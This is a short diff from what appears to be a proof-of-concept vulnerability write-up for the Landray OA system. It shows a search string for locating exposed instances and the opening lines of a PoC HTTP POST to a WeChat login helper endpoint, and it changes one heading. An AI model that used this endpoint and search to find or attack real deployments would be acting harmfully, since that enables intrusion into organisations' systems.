@@ -5,7 +5,7 @@
 app="Landray-OA系统"
 ```
 
-## poc
+## POC
 ```
 POST /third/wechat/wechatLoginHelper.do HTTP/1.1
 Host: xxx.xxx.xxx.xxx
